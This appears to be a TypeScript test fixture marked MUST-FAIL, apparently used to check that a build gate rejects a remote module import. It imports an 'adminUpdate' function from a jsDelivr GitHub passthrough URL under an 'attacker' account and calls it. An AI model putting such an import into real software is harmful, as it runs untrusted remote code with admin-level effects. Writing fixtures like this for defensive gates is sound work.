// MUST-FAIL (M2 BLOCKING, post-P3a re-gate): same shape as
// m2-raw-esm-gh.ts, on cdn.jsdelivr.net's own "gh/" GitHub passthrough.
import { adminUpdate } from "https://cdn.jsdelivr.net/gh/attacker/admin-lib@main/mod.js";

export async function voidPlay(playId: string) {
  return adminUpdate(playId);
}
